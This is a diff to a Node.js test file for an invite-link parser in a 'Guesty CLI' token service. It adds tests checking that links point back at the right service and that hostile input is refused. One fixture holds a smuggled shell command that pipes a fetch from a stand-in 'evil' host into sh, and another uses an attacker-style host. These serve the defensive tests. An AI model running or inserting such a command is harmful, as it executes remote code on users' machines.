@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { HOSTED_TOKEN_SERVICE_URL, parseInvite } from "../dist/token-service.js";
+import { HOSTED_TOKEN_SERVICE_URL, invitedLink, parseInvite } from "../dist/token-service.js";
 
 test("invite: a code alone is for the hosted service, in any case and with misread letters", () => {
   assert.deepEqual(parseInvite("abcd-efgh-jkmn"), { kind: "code", url: HOSTED_TOKEN_SERVICE_URL, code: "ABCDEFGHJKMN" });
@@ -26,4 +26,15 @@ test("invite: anything else is refused with what an invite looks like", () => {
   assert.throws(() => parseInvite("https://tokens.example.com/listings/ABCD-EFGH-JKMN"), /isn't a Guesty CLI invite link/);
   assert.throws(() => parseInvite("https://tokens.example.com/join/ABCD-EFGH-JKMN?ref=mail"), /isn't a Guesty CLI invite link/);
   assert.throws(() => parseInvite("gti_bm90LWpzb24"), /not a Guesty CLI invite code/);
+});
+
+test("invite: a link from the service must point back at it, and the command is built here", () => {
+  assert.deepEqual(invitedLink(HOSTED_TOKEN_SERVICE_URL, `${HOSTED_TOKEN_SERVICE_URL}/join/abcd-efgh-jkmn`),
+    { link: `${HOSTED_TOKEN_SERVICE_URL}/join/ABCD-EFGH-JKMN`, command: "guesty join ABCD-EFGH-JKMN" });
+  assert.deepEqual(invitedLink("https://tokens.example.com", "https://tokens.example.com/join/ABCD-EFGH-JKMN"),
+    { link: "https://tokens.example.com/join/ABCD-EFGH-JKMN", command: "guesty join https://tokens.example.com/join/ABCD-EFGH-JKMN" });
+  assert.throws(() => invitedLink("https://tokens.example.com", "https://evil.example/join/ABCD-EFGH-JKMN"), /for a different service/);
+  assert.throws(() => invitedLink("https://tokens.example.com", "https://tokens.example.com/join/ABCD-EFGH-JKMN && curl evil | sh"), /invalid invite link/);
+  assert.throws(() => invitedLink(HOSTED_TOKEN_SERVICE_URL, "ABCD-EFGH-JKMN"), /invalid invite link/);
+  assert.throws(() => invitedLink(HOSTED_TOKEN_SERVICE_URL, 42), /invalid invite link/);
 });
